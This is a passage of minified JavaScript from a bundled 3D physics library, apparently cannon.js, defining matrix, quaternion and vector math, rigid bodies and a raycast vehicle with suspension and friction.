0!==e.restitution?e.restitution:-1}t.exports=n,n.idCounter=0},{}],26:[function(e,t,i){t.exports=r;var n=e("./Vec3");function r(){this.spatial=new n,this.rotational=new n}r.prototype.multiplyElement=function(e){return e.spatial.dot(this.spatial)+e.rotational.dot(this.rotational)},r.prototype.multiplyVectors=function(e,t){return e.dot(this.spatial)+t.dot(this.rotational)}},{"./Vec3":30}],27:[function(e,t,i){t.exports=r;var n=e("./Vec3");function r(e){this.elements=e||[0,0,0,0,0,0,0,0,0]}r.prototype.identity=function(){var e=this.elements;e[0]=1,e[1]=0,e[2]=0,e[3]=0,e[4]=1,e[5]=0,e[6]=0,e[7]=0,e[8]=1},r.prototype.setZero=function(){var e=this.elements;e[0]=0,e[1]=0,e[2]=0,e[3]=0,e[4]=0,e[5]=0,e[6]=0,e[7]=0,e[8]=0},r.prototype.setTrace=function(e){var t=this.elements;t[0]=e.x,t[4]=e.y,t[8]=e.z},r.prototype.getTrace=function(e){e=e||new n;var t=this.elements;e.x=t[0],e.y=t[4],e.z=t[8]},r.prototype.vmult=function(e,t){t=t||new n;var i=this.elements,r=e.x,o=e.y,a=e.z;return t.x=i[0]*r+i[1]*o+i[2]*a,t.y=i[3]*r+i[4]*o+i[5]*a,t.z=i[6]*r+i[7]*o+i[8]*a,t},r.prototype.smult=function(e){for(var t=0;t<this.elements.length;t++)this.elements[t]*=e},r.prototype.mmult=function(e,t){for(var i=t||new r,n=0;n<3;n++)for(var o=0;o<3;o++){for(var a=0,s=0;s<3;s++)a+=e.elements[n+3*s]*this.elements[s+3*o];i.elements[n+3*o]=a}return i},r.prototype.scale=function(e,t){t=t||new r;for(var i=this.elements,n=t.elements,o=0;3!==o;o++)n[3*o+0]=e.x*i[3*o+0],n[3*o+1]=e.y*i[3*o+1],n[3*o+2]=e.z*i[3*o+2];return t},r.prototype.solve=function(e,t){t=t||new n;for(var i,r=[],o=0;o<12;o++)r.push(0);for(o=0;o<3;o++)for(i=0;i<3;i++)r[o+4*i]=this.elements[o+3*i];r[3]=e.x,r[7]=e.y,r[11]=e.z;var a,s,c=3,l=c;do{if(0===r[(o=l-c)+4*o])for(i=o+1;i<l;i++)if(0!==r[o+4*i]){a=4;do{r[(s=4-a)+4*o]+=r[s+4*i]}while(--a);break}if(0!==r[o+4*o])for(i=o+1;i<l;i++){var h=r[o+4*i]/r[o+4*o];a=4;do{r[(s=4-a)+4*i]=s<=o?0:r[s+4*i]-r[s+4*o]*h}while(--a)}}while(--c);if(t.z=r[11]/r[10],t.y=(r[7]-r[6]*t.z)/r[5],t.x=(r[3]-r[2]*t.z-r[1]*t.y)/r[0],isNaN(t.x)||isNaN(t.y)||isNaN(t.z)||t.x===1/0||t.y===1/0||t.z===1/0)throw"Could not solve equation! Got x=["+t.toString()+"], b=["+e.toString()+"], A=["+this.toString()+"]";return t},r.prototype.e=function(e,t,i){if(void 0===i)return this.elements[t+3*e];this.elements[t+3*e]=i},r.prototype.copy=function(e){for(var t=0;t<e.elements.length;t++)this.elements[t]=e.elements[t];return this},r.prototype.toString=function(){for(var e="",t=0;t<9;t++)e+=this.elements[t]+",";return e},r.prototype.reverse=function(e){e=e||new r;for(var t,i=[],n=0;n<18;n++)i.push(0);for(n=0;n<3;n++)for(t=0;t<3;t++)i[n+6*t]=this.elements[n+3*t];i[3]=1,i[9]=0,i[15]=0,i[4]=0,i[10]=1,i[16]=0,i[5]=0,i[11]=0,i[17]=1;var o,a,s=3,c=s;do{if(0===i[(n=c-s)+6*n])for(t=n+1;t<c;t++)if(0!==i[n+6*t]){o=6;do{i[(a=6-o)+6*n]+=i[a+6*t]}while(--o);break}if(0!==i[n+6*n])for(t=n+1;t<c;t++){var l=i[n+6*t]/i[n+6*n];o=6;do{i[(a=6-o)+6*t]=a<=n?0:i[a+6*t]-i[a+6*n]*l}while(--o)}}while(--s);n=2;do{t=n-1;do{l=i[n+6*t]/i[n+6*n],o=6;do{i[(a=6-o)+6*t]=i[a+6*t]-i[a+6*n]*l}while(--o)}while(t--)}while(--n);n=2;do{l=1/i[n+6*n],o=6;do{i[(a=6-o)+6*n]=i[a+6*n]*l}while(--o)}while(n--);n=2;do{t=2;do{if(a=i[3+t+6*n],isNaN(a)||a===1/0)throw"Could not reverse! A=["+this.toString()+"]";e.e(n,t,a)}while(t--)}while(n--);return e},r.prototype.setRotationFromQuaternion=function(e){var t=e.x,i=e.y,n=e.z,r=e.w,o=t+t,a=i+i,s=n+n,c=t*o,l=t*a,h=t*s,u=i*a,d=i*s,p=n*s,f=r*o,m=r*a,v=r*s,g=this.elements;return g[0]=1-(u+p),g[1]=l-v,g[2]=h+m,g[3]=l+v,g[4]=1-(c+p),g[5]=d-f,g[6]=h-m,g[7]=d+f,g[8]=1-(c+u),this},r.prototype.transpose=function(e){for(var t=(e=e||new r).elements,i=this.elements,n=0;3!==n;n++)for(var o=0;3!==o;o++)t[3*n+o]=i[3*o+n];return e}},{"./Vec3":30}],28:[function(e,t,i){t.exports=r;var n=e("./Vec3");function r(e,t,i,n){this.x=void 0!==e?e:0,this.y=void 0!==t?t:0,this.z=void 0!==i?i:0,this.w=void 0!==n?n:1}r.prototype.set=function(e,t,i,n){this.x=e,this.y=t,this.z=i,this.w=n},r.prototype.toString=function(){return this.x+","+this.y+","+this.z+","+this.w},r.prototype.toArray=function(){return[this.x,this.y,this.z,this.w]},r.prototype.setFromAxisAngle=function(e,t){var i=Math.sin(.5*t);this.x=e.x*i,this.y=e.y*i,this.z=e.z*i,this.w=Math.cos(.5*t)},r.prototype.toAxisAngle=function(e){e=e||new n,this.normalize();var t=2*Math.acos(this.w),i=Math.sqrt(1-this.w*this.w);return i<.001?(e.x=this.x,e.y=this.y,e.z=this.z):(e.x=this.x/i,e.y=this.y/i,e.z=this.z/i),[e,t]};var o=new n,a=new n;r.prototype.setFromVectors=function(e,t){if(e.isAntiparallelTo(t)){var i=o,n=a;e.tangents(i,n),this.setFromAxisAngle(i,Math.PI)}else{var r=e.cross(t);this.x=r.x,this.y=r.y,this.z=r.z,this.w=Math.sqrt(Math.pow(e.norm(),2)*Math.pow(t.norm(),2))+e.dot(t),this.normalize()}};var s=new n,c=new n,l=new n;r.prototype.mult=function(e,t){t=t||new r;var i=this.w,n=s,o=c,a=l;return n.set(this.x,this.y,this.z),o.set(e.x,e.y,e.z),t.w=i*e.w-n.dot(o),n.cross(o,a),t.x=i*o.x+e.w*n.x+a.x,t.y=i*o.y+e.w*n.y+a.y,t.z=i*o.z+e.w*n.z+a.z,t},r.prototype.inverse=function(e){var t=this.x,i=this.y,n=this.z,o=this.w;e=e||new r,this.conjugate(e);var a=1/(t*t+i*i+n*n+o*o);return e.x*=a,e.y*=a,e.z*=a,e.w*=a,e},r.prototype.conjugate=function(e){return(e=e||new r).x=-this.x,e.y=-this.y,e.z=-this.z,e.w=this.w,e},r.prototype.normalize=function(){var e=Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w);0===e?(this.x=0,this.y=0,this.z=0,this.w=0):(e=1/e,this.x*=e,this.y*=e,this.z*=e,this.w*=e)},r.prototype.normalizeFast=function(){var e=(3-(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w))/2;0===e?(this.x=0,this.y=0,this.z=0,this.w=0):(this.x*=e,this.y*=e,this.z*=e,this.w*=e)},r.prototype.vmult=function(e,t){t=t||new n;var i=e.x,r=e.y,o=e.z,a=this.x,s=this.y,c=this.z,l=this.w,h=l*i+s*o-c*r,u=l*r+c*i-a*o,d=l*o+a*r-s*i,p=-a*i-s*r-c*o;return t.x=h*l+p*-a+u*-c-d*-s,t.y=u*l+p*-s+d*-a-h*-c,t.z=d*l+p*-c+h*-s-u*-a,t},r.prototype.copy=function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=e.w,this},r.prototype.toEuler=function(e,t){var i,n,r;t=t||"YZX";var o=this.x,a=this.y,s=this.z,c=this.w;switch(t){case"YZX":var l=o*a+s*c;if(l>.499&&(i=2*Math.atan2(o,c),n=Math.PI/2,r=0),l<-.499&&(i=-2*Math.atan2(o,c),n=-Math.PI/2,r=0),isNaN(i)){var h=o*o,u=a*a,d=s*s;i=Math.atan2(2*a*c-2*o*s,1-2*u-2*d),n=Math.asin(2*l),r=Math.atan2(2*o*c-2*a*s,1-2*h-2*d)}break;default:throw new Error("Euler order "+t+" not supported yet.")}e.y=i,e.z=n,e.x=r},r.prototype.setFromEuler=function(e,t,i,n){n=n||"XYZ";var r=Math.cos(e/2),o=Math.cos(t/2),a=Math.cos(i/2),s=Math.sin(e/2),c=Math.sin(t/2),l=Math.sin(i/2);return"XYZ"===n?(this.x=s*o*a+r*c*l,this.y=r*c*a-s*o*l,this.z=r*o*l+s*c*a,this.w=r*o*a-s*c*l):"YXZ"===n?(this.x=s*o*a+r*c*l,this.y=r*c*a-s*o*l,this.z=r*o*l-s*c*a,this.w=r*o*a+s*c*l):"ZXY"===n?(this.x=s*o*a-r*c*l,this.y=r*c*a+s*o*l,this.z=r*o*l+s*c*a,this.w=r*o*a-s*c*l):"ZYX"===n?(this.x=s*o*a-r*c*l,this.y=r*c*a+s*o*l,this.z=r*o*l-s*c*a,this.w=r*o*a+s*c*l):"YZX"===n?(this.x=s*o*a+r*c*l,this.y=r*c*a+s*o*l,this.z=r*o*l-s*c*a,this.w=r*o*a-s*c*l):"XZY"===n&&(this.x=s*o*a-r*c*l,this.y=r*c*a-s*o*l,this.z=r*o*l+s*c*a,this.w=r*o*a+s*c*l),this},r.prototype.clone=function(){return new r(this.x,this.y,this.z,this.w)}},{"./Vec3":30}],29:[function(e,t,i){var n=e("./Vec3"),r=e("./Quaternion");function o(e){e=e||{},this.position=new n,e.position&&this.position.copy(e.position),this.quaternion=new r,e.quaternion&&this.quaternion.copy(e.quaternion)}t.exports=o;var a=new r;o.pointToLocalFrame=function(e,t,i,r){return r=r||new n,i.vsub(e,r),t.conjugate(a),a.vmult(r,r),r},o.prototype.pointToLocal=function(e,t){return o.pointToLocalFrame(this.position,this.quaternion,e,t)},o.pointToWorldFrame=function(e,t,i,r){return r=r||new n,t.vmult(i,r),r.vadd(e,r),r},o.prototype.pointToWorld=function(e,t){return o.pointToWorldFrame(this.position,this.quaternion,e,t)},o.prototype.vectorToWorldFrame=function(e,t){return t=t||new n,this.quaternion.vmult(e,t),t},o.vectorToWorldFrame=function(e,t,i){return e.vmult(t,i),i},o.vectorToLocalFrame=function(e,t,i,r){return r=r||new n,t.w*=-1,t.vmult(i,r),t.w*=-1,r}},{"./Quaternion":28,"./Vec3":30}],30:[function(e,t,i){t.exports=r;var n=e("./Mat3");function r(e,t,i){this.x=e||0,this.y=t||0,this.z=i||0}r.ZERO=new r(0,0,0),r.UNIT_X=new r(1,0,0),r.UNIT_Y=new r(0,1,0),r.UNIT_Z=new r(0,0,1),r.prototype.cross=function(e,t){var i=e.x,n=e.y,o=e.z,a=this.x,s=this.y,c=this.z;return(t=t||new r).x=s*o-c*n,t.y=c*i-a*o,t.z=a*n-s*i,t},r.prototype.set=function(e,t,i){return this.x=e,this.y=t,this.z=i,this},r.prototype.setZero=function(){this.x=this.y=this.z=0},r.prototype.vadd=function(e,t){if(!t)return new r(this.x+e.x,this.y+e.y,this.z+e.z);t.x=e.x+this.x,t.y=e.y+this.y,t.z=e.z+this.z},r.prototype.vsub=function(e,t){if(!t)return new r(this.x-e.x,this.y-e.y,this.z-e.z);t.x=this.x-e.x,t.y=this.y-e.y,t.z=this.z-e.z},r.prototype.crossmat=function(){return new n([0,-this.z,this.y,this.z,0,-this.x,-this.y,this.x,0])},r.prototype.normalize=function(){var e=this.x,t=this.y,i=this.z,n=Math.sqrt(e*e+t*t+i*i);if(n>0){var r=1/n;this.x*=r,this.y*=r,this.z*=r}else this.x=0,this.y=0,this.z=0;return n},r.prototype.unit=function(e){e=e||new r;var t=this.x,i=this.y,n=this.z,o=Math.sqrt(t*t+i*i+n*n);return o>0?(o=1/o,e.x=t*o,e.y=i*o,e.z=n*o):(e.x=1,e.y=0,e.z=0),e},r.prototype.norm=function(){var e=this.x,t=this.y,i=this.z;return Math.sqrt(e*e+t*t+i*i)},r.prototype.length=r.prototype.norm,r.prototype.norm2=function(){return this.dot(this)},r.prototype.lengthSquared=r.prototype.norm2,r.prototype.distanceTo=function(e){var t=this.x,i=this.y,n=this.z,r=e.x,o=e.y,a=e.z;return Math.sqrt((r-t)*(r-t)+(o-i)*(o-i)+(a-n)*(a-n))},r.prototype.distanceSquared=function(e){var t=this.x,i=this.y,n=this.z,r=e.x,o=e.y,a=e.z;return(r-t)*(r-t)+(o-i)*(o-i)+(a-n)*(a-n)},r.prototype.mult=function(e,t){t=t||new r;var i=this.x,n=this.y,o=this.z;return t.x=e*i,t.y=e*n,t.z=e*o,t},r.prototype.scale=r.prototype.mult,r.prototype.dot=function(e){return this.x*e.x+this.y*e.y+this.z*e.z},r.prototype.isZero=function(){return 0===this.x&&0===this.y&&0===this.z},r.prototype.negate=function(e){return(e=e||new r).x=-this.x,e.y=-this.y,e.z=-this.z,e};var o=new r,a=new r;r.prototype.tangents=function(e,t){var i=this.norm();if(i>0){var n=o,r=1/i;n.set(this.x*r,this.y*r,this.z*r);var s=a;Math.abs(n.x)<.9?(s.set(1,0,0),n.cross(s,e)):(s.set(0,1,0),n.cross(s,e)),n.cross(e,t)}else e.set(1,0,0),t.set(0,1,0)},r.prototype.toString=function(){return this.x+","+this.y+","+this.z},r.prototype.toArray=function(){return[this.x,this.y,this.z]},r.prototype.copy=function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this},r.prototype.lerp=function(e,t,i){var n=this.x,r=this.y,o=this.z;i.x=n+(e.x-n)*t,i.y=r+(e.y-r)*t,i.z=o+(e.z-o)*t},r.prototype.almostEquals=function(e,t){return void 0===t&&(t=1e-6),!(Math.abs(this.x-e.x)>t||Math.abs(this.y-e.y)>t||Math.abs(this.z-e.z)>t)},r.prototype.almostZero=function(e){return void 0===e&&(e=1e-6),!(Math.abs(this.x)>e||Math.abs(this.y)>e||Math.abs(this.z)>e)};var s=new r;r.prototype.isAntiparallelTo=function(e,t){return this.negate(s),s.almostEquals(e,t)},r.prototype.clone=function(){return new r(this.x,this.y,this.z)}},{"./Mat3":27}],31:[function(e,t,i){t.exports=l;var n=e("../utils/EventTarget"),r=(e("../shapes/Shape"),e("../math/Vec3")),o=e("../math/Mat3"),a=e("../math/Quaternion"),s=(e("../material/Material"),e("../collision/AABB")),c=e("../shapes/Box");function l(e){e=e||{},n.apply(this),this.id=l.idCounter++,this.world=null,this.preStep=null,this.postStep=null,this.vlambda=new r,this.collisionFilterGroup="number"==typeof e.collisionFilterGroup?e.collisionFilterGroup:1,this.collisionFilterMask="number"==typeof e.collisionFilterMask?e.collisionFilterMask:1,this.collisionResponse=!0,this.position=new r,e.position&&this.position.copy(e.position),this.previousPosition=new r,this.initPosition=new r,this.velocity=new r,e.velocity&&this.velocity.copy(e.velocity),this.initVelocity=new r,this.force=new r;var t="number"==typeof e.mass?e.mass:0;this.mass=t,this.invMass=t>0?1/t:0,this.material=e.material||null,this.linearDamping="number"==typeof e.linearDamping?e.linearDamping:.01,this.type=t<=0?l.STATIC:l.DYNAMIC,typeof e.type==typeof l.STATIC&&(this.type=e.type),this.allowSleep=void 0===e.allowSleep||e.allowSleep,this.sleepState=0,this.sleepSpeedLimit=void 0!==e.sleepSpeedLimit?e.sleepSpeedLimit:.1,this.sleepTimeLimit=void 0!==e.sleepTimeLimit?e.sleepTimeLimit:1,this.timeLastSleepy=0,this._wakeUpAfterNarrowphase=!1,this.torque=new r,this.quaternion=new a,e.quaternion&&this.quaternion.copy(e.quaternion),this.initQuaternion=new a,this.angularVelocity=new r,e.angularVelocity&&this.angularVelocity.copy(e.angularVelocity),this.initAngularVelocity=new r,this.interpolatedPosition=new r,this.interpolatedQuaternion=new a,this.shapes=[],this.shapeOffsets=[],this.shapeOrientations=[],this.inertia=new r,this.invInertia=new r,this.invInertiaWorld=new o,this.invMassSolve=0,this.invInertiaSolve=new r,this.invInertiaWorldSolve=new o,this.fixedRotation=void 0!==e.fixedRotation&&e.fixedRotation,this.angularDamping=void 0!==e.angularDamping?e.angularDamping:.01,this.aabb=new s,this.aabbNeedsUpdate=!0,this.wlambda=new r,e.shape&&this.addShape(e.shape),this.updateMassProperties()}l.prototype=new n,l.prototype.constructor=l,l.DYNAMIC=1,l.STATIC=2,l.KINEMATIC=4,l.AWAKE=0,l.SLEEPY=1,l.SLEEPING=2,l.idCounter=0,l.prototype.wakeUp=function(){var e=this.sleepState;this.sleepState=0,e===l.SLEEPING&&this.dispatchEvent({type:"wakeup"})},l.prototype.sleep=function(){this.sleepState=l.SLEEPING,this.velocity.set(0,0,0),this.angularVelocity.set(0,0,0)},l.sleepyEvent={type:"sleepy"},l.sleepEvent={type:"sleep"},l.prototype.sleepTick=function(e){if(this.allowSleep){var t=this.sleepState,i=this.velocity.norm2()+this.angularVelocity.norm2(),n=Math.pow(this.sleepSpeedLimit,2);t===l.AWAKE&&i<n?(this.sleepState=l.SLEEPY,this.timeLastSleepy=e,this.dispatchEvent(l.sleepyEvent)):t===l.SLEEPY&&i>n?this.wakeUp():t===l.SLEEPY&&e-this.timeLastSleepy>this.sleepTimeLimit&&(this.sleep(),this.dispatchEvent(l.sleepEvent))}},l.prototype.updateSolveMassProperties=function(){this.sleepState===l.SLEEPING||this.type===l.KINEMATIC?(this.invMassSolve=0,this.invInertiaSolve.setZero(),this.invInertiaWorldSolve.setZero()):(this.invMassSolve=this.invMass,this.invInertiaSolve.copy(this.invInertia),this.invInertiaWorldSolve.copy(this.invInertiaWorld))},l.prototype.pointToLocalFrame=function(e,t){return t=t||new r,e.vsub(this.position,t),this.quaternion.conjugate().vmult(t,t),t},l.prototype.vectorToLocalFrame=function(e,t){return t=t||new r,this.quaternion.conjugate().vmult(e,t),t},l.prototype.pointToWorldFrame=function(e,t){return t=t||new r,this.quaternion.vmult(e,t),t.vadd(this.position,t),t},l.prototype.vectorToWorldFrame=function(e,t){return t=t||new r,this.quaternion.vmult(e,t),t};var h=new r,u=new a;l.prototype.addShape=function(e,t,i){var n=new r,o=new a;return t&&n.copy(t),i&&o.copy(i),this.shapes.push(e),this.shapeOffsets.push(n),this.shapeOrientations.push(o),this.updateMassProperties(),this.updateBoundingRadius(),this.aabbNeedsUpdate=!0,this},l.prototype.updateBoundingRadius=function(){for(var e=this.shapes,t=this.shapeOffsets,i=e.length,n=0,r=0;r!==i;r++){var o=e[r];o.updateBoundingSphereRadius();var a=t[r].norm(),s=o.boundingSphereRadius;a+s>n&&(n=a+s)}this.boundingRadius=n};var d=new s;l.prototype.computeAABB=function(){for(var e=this.shapes,t=this.shapeOffsets,i=this.shapeOrientations,n=e.length,r=h,o=u,a=this.quaternion,s=this.aabb,c=d,l=0;l!==n;l++){var p=e[l];i[l].mult(a,o),o.vmult(t[l],r),r.vadd(this.position,r),p.calculateWorldAABB(r,o,c.lowerBound,c.upperBound),0===l?s.copy(c):s.extend(c)}this.aabbNeedsUpdate=!1};var p=new o,f=new o;new o,l.prototype.updateInertiaWorld=function(e){var t=this.invInertia;if(t.x!==t.y||t.y!==t.z||e){var i=p,n=f;i.setRotationFromQuaternion(this.quaternion),i.transpose(n),i.scale(t,i),i.mmult(n,this.invInertiaWorld)}};var m=new r,v=new r;l.prototype.applyForce=function(e,t){if(this.type===l.DYNAMIC){var i=m;t.vsub(this.position,i);var n=v;i.cross(e,n),this.force.vadd(e,this.force),this.torque.vadd(n,this.torque)}};var g=new r,y=new r;l.prototype.applyLocalForce=function(e,t){if(this.type===l.DYNAMIC){var i=g,n=y;this.vectorToWorldFrame(e,i),this.pointToWorldFrame(t,n),this.applyForce(i,n)}};var b=new r,w=new r,x=new r;l.prototype.applyImpulse=function(e,t){if(this.type===l.DYNAMIC){var i=b;t.vsub(this.position,i);var n=w;n.copy(e),n.mult(this.invMass,n),this.velocity.vadd(n,this.velocity);var r=x;i.cross(e,r),this.invInertiaWorld.vmult(r,r),this.angularVelocity.vadd(r,this.angularVelocity)}};var _=new r,M=new r;l.prototype.applyLocalImpulse=function(e,t){if(this.type===l.DYNAMIC){var i=_,n=M;this.vectorToWorldFrame(e,i),this.pointToWorldFrame(t,n),this.applyImpulse(i,n)}};var S=new r;l.prototype.updateMassProperties=function(){var e=S;this.invMass=this.mass>0?1/this.mass:0;var t=this.inertia,i=this.fixedRotation;this.computeAABB(),e.set((this.aabb.upperBound.x-this.aabb.lowerBound.x)/2,(this.aabb.upperBound.y-this.aabb.lowerBound.y)/2,(this.aabb.upperBound.z-this.aabb.lowerBound.z)/2),c.calculateInertia(e,this.mass,t),this.invInertia.set(t.x>0&&!i?1/t.x:0,t.y>0&&!i?1/t.y:0,t.z>0&&!i?1/t.z:0),this.updateInertiaWorld(!0)},l.prototype.getVelocityAtWorldPoint=function(e,t){var i=new r;return e.vsub(this.position,i),this.angularVelocity.cross(i,t),this.velocity.vadd(t,t),t}},{"../collision/AABB":3,"../material/Material":25,"../math/Mat3":27,"../math/Quaternion":28,"../math/Vec3":30,"../shapes/Box":37,"../shapes/Shape":43,"../utils/EventTarget":49}],32:[function(e,t,i){e("./Body");var n=e("../math/Vec3"),r=e("../math/Quaternion"),o=(e("../collision/RaycastResult"),e("../collision/Ray")),a=e("../objects/WheelInfo");function s(e){this.chassisBody=e.chassisBody,this.wheelInfos=[],this.sliding=!1,this.world=null,this.indexRightAxis=void 0!==e.indexRightAxis?e.indexRightAxis:1,this.indexForwardAxis=void 0!==e.indexForwardAxis?e.indexForwardAxis:0,this.indexUpAxis=void 0!==e.indexUpAxis?e.indexUpAxis:2}t.exports=s,new n,new n,new n;var c=new n,l=new n,h=new n;new o,s.prototype.addWheel=function(e){var t=new a(e=e||{}),i=this.wheelInfos.length;return this.wheelInfos.push(t),i},s.prototype.setSteeringValue=function(e,t){this.wheelInfos[t].steering=e},new n,s.prototype.applyEngineForce=function(e,t){this.wheelInfos[t].engineForce=e},s.prototype.setBrake=function(e,t){this.wheelInfos[t].brake=e},s.prototype.addToWorld=function(e){this.constraints,e.add(this.chassisBody);var t=this;this.preStepCallback=function(){t.updateVehicle(e.dt)},e.addEventListener("preStep",this.preStepCallback),this.world=e},s.prototype.getVehicleAxisWorld=function(e,t){t.set(0===e?1:0,1===e?1:0,2===e?1:0),this.chassisBody.vectorToWorldFrame(t,t)},s.prototype.updateVehicle=function(e){for(var t=this.wheelInfos,i=t.length,r=this.chassisBody,o=0;o<i;o++)this.updateWheelTransform(o);this.currentVehicleSpeedKmHour=3.6*r.velocity.norm();var a=new n;for(this.getVehicleAxisWorld(this.indexForwardAxis,a),a.dot(r.velocity)<0&&(this.currentVehicleSpeedKmHour*=-1),o=0;o<i;o++)this.castRay(t[o]);this.updateSuspension(e);var s=new n,c=new n;for(o=0;o<i;o++){var l=(p=t[o]).suspensionForce;l>p.maxSuspensionForce&&(l=p.maxSuspensionForce),p.raycastResult.hitNormalWorld.scale(l*e,s),p.raycastResult.hitPointWorld.vsub(r.position,c),r.applyImpulse(s,p.raycastResult.hitPointWorld)}this.updateFriction(e);var h=new n,u=new n,d=new n;for(o=0;o<i;o++){var p=t[o];r.getVelocityAtWorldPoint(p.chassisConnectionPointWorld,d);var f=1;switch(this.indexUpAxis){case 1:f=-1}if(p.isInContact){this.getVehicleAxisWorld(this.indexForwardAxis,u);var m=u.dot(p.raycastResult.hitNormalWorld);p.raycastResult.hitNormalWorld.scale(m,h),u.vsub(h,u);var v=u.dot(d);p.deltaRotation=f*v*e/p.radius}!p.sliding&&p.isInContact||0===p.engineForce||!p.useCustomSlidingRotationalSpeed||(p.deltaRotation=(p.engineForce>0?1:-1)*p.customSlidingRotationalSpeed*e),Math.abs(p.brake)>Math.abs(p.engineForce)&&(p.deltaRotation=0),p.rotation+=p.deltaRotation,p.deltaRotation*=.99}},s.prototype.updateSuspension=function(e){for(var t=this.chassisBody.mass,i=this.wheelInfos,n=i.length,r=0;r<n;r++){var o=i[r];if(o.isInContact){var a,s=o.suspensionRestLength-o.suspensionLength;a=o.suspensionStiffness*s*o.clippedInvContactDotSuspension;var c=o.suspensionRelativeVelocity;a-=(c<0?o.dampingCompression:o.dampingRelaxation)*c,o.suspensionForce=a*t,o.suspensionForce<0&&(o.suspensionForce=0)}else o.suspensionForce=0}},s.prototype.removeFromWorld=function(e){this.constraints,e.remove(this.chassisBody),e.removeEventListener("preStep",this.preStepCallback),this.world=null};var u=new n,d=new n;s.prototype.castRay=function(e){var t=u,i=d;this.updateWheelTransformWorld(e);var r=this.chassisBody,o=-1,a=e.suspensionRestLength+e.radius;e.directionWorld.scale(a,t);var s=e.chassisConnectionPointWorld;s.vadd(t,i);var c=e.raycastResult;c.reset();var l=r.collisionResponse;r.collisionResponse=!1,this.world.rayTest(s,i,c),r.collisionResponse=l;var h=c.body;if(e.raycastResult.groundObject=0,h){o=c.distance,e.raycastResult.hitNormalWorld=c.hitNormalWorld,e.isInContact=!0;var p=c.distance;e.suspensionLength=p-e.radius;var f=e.suspensionRestLength-e.maxSuspensionTravel,m=e.suspensionRestLength+e.maxSuspensionTravel;e.suspensionLength<f&&(e.suspensionLength=f),e.suspensionLength>m&&(e.suspensionLength=m,e.raycastResult.reset());var v=e.raycastResult.hitNormalWorld.dot(e.directionWorld),g=new n;r.getVelocityAtWorldPoint(e.raycastResult.hitPointWorld,g);var y=e.raycastResult.hitNormalWorld.dot(g);if(v>=-.1)e.suspensionRelativeVelocity=0,e.clippedInvContactDotSuspension=10;else{var b=-1/v;e.suspensionRelativeVelocity=y*b,e.clippedInvContactDotSuspension=b}}else e.suspensionLength=e.suspensionRestLength+0*e.maxSuspensionTravel,e.suspensionRelativeVelocity=0,e.directionWorld.scale(-1,e.raycastResult.hitNormalWorld),e.clippedInvContactDotSuspension=1;return o},s.prototype.updateWheelTransformWorld=function(e){e.isInContact=!1;var t=this.chassisBody;t.pointToWorldFrame(e.chassisConnectionPointLocal,e.chassisConnectionPointWorld),t.vectorToWorldFrame(e.directionLocal,e.directionWorld),t.vectorToWorldFrame(e.axleLocal,e.axleWorld)},s.prototype.updateWheelTransform=function(e){var t=c,i=l,n=h,o=this.wheelInfos[e];this.updateWheelTransformWorld(o),o.directionLocal.scale(-1,t),i.copy(o.axleLocal),t.cross(i,n),n.normalize(),i.normalize();var a=o.steering,s=new r;s.setFromAxisAngle(t,a);var u=new r;u.setFromAxisAngle(i,o.rotation);var d=o.worldTransform.quaternion;this.chassisBody.quaternion.mult(s,d),d.mult(u,d),d.normalize();var p=o.worldTransform.position;p.copy(o.directionWorld),p.scale(o.suspensionLength,p),p.vadd(o.chassisConnectionPointWorld,p)};var p=[new n(1,0,0),new n(0,1,0),new n(0,0,1)];s.prototype.getWheelTransformWorld=function(e){return this.wheelInfos[e].worldTransform};var f=new n,m=[],v=[];s.prototype.updateFriction=function(e){for(var t=f,i=this.wheelInfos,r=i.length,o=this.chassisBody,a=v,s=m,c=0;c<r;c++)d=(E=i[c]).raycastResult.body,E.sideImpulse=0,E.forwardImpulse=0,a[c]||(a[c]=new n),s[c]||(s[c]=new n);for(c=0;c<r;c++)if(d=(E=i[c]).raycastResult.body){var l=s[c];this.getWheelTransformWorld(c).vectorToWorldFrame(p[this.indexRightAxis],l);var h=E.raycastResult.hitNormalWorld,u=l.dot(h);h.scale(u,t),l.vsub(t,l),l.normalize(),h.cross(l,a[c]),a[c].normalize(),E.sideImpulse=P(o,E.raycastResult.hitPointWorld,d,E.raycastResult.hitPointWorld,l),E.sideImpulse*=1}for(this.sliding=!1,c=0;c<r;c++){var d=(E=i[c]).raycastResult.body,g=0;if(E.slipInfo=1,d){var y=E.brake?E.brake:0;g=w(o,d,E.raycastResult.hitPointWorld,a[c],y);var b=y/(g+=E.engineForce*e);E.slipInfo*=b}if(E.forwardImpulse=0,E.skidInfo=1,d){E.skidInfo=1;var x=E.suspensionForce*e*E.frictionSlip,_=x*x;E.forwardImpulse=g;var M=.5*E.forwardImpulse,S=1*E.sideImpulse,T=M*M+S*S;E.sliding=!1,T>_&&(this.sliding=!0,E.sliding=!0,b=x/Math.sqrt(T),E.skidInfo*=b)}}if(this.sliding)for(c=0;c<r;c++)0!==(E=i[c]).sideImpulse&&E.skidInfo<1&&(E.forwardImpulse*=E.skidInfo,E.sideImpulse*=E.skidInfo);for(c=0;c<r;c++){var E=i[c],A=new n;if(A.copy(E.raycastResult.hitPointWorld),0!==E.forwardImpulse){var C=new n;a[c].scale(E.forwardImpulse,C),o.applyImpulse(C,A)}if(0!==E.sideImpulse){d=E.raycastResult.body;var L=new n;L.copy(E.raycastResult.hitPointWorld);var R=new n;s[c].scale(E.sideImpulse,R),o.pointToLocalFrame(A,A),A["xyz"[this.indexUpAxis]]*=E.rollInfluence,o.pointToWorldFrame(A,A),o.applyImpulse(R,A),R.scale(-1,R),d.applyImpulse(R,L)}}};var g=new n,y=new n,b=new n;function w(e,t,i,n,r){var o=0,a=i,s=g,c=y,l=b;return e.getVelocityAtWorldPoint(a,s),t.getVelocityAtWorldPoint(a,c),s.vsub(c,l),r<(o=-n.dot(l)*(1/(T(e,i,n)+T(t,i,n))))&&(o=r),o<-r&&(o=-r),o}var x=new n,_=new n,M=new n,S=new n;function T(e,t,i){var n=x,r=_,o=M,a=S;return t.vsub(e.position,n),n.cross(i,r),e.invInertiaWorld.vmult(r,a),a.cross(n,o),e.invMass+i.dot(o)}var E=new n,A=new n,C=new n;function P(e,t,i,n,r,o){if(r.norm2()>1.1)return 0;var a=E,s=A,c=C;return 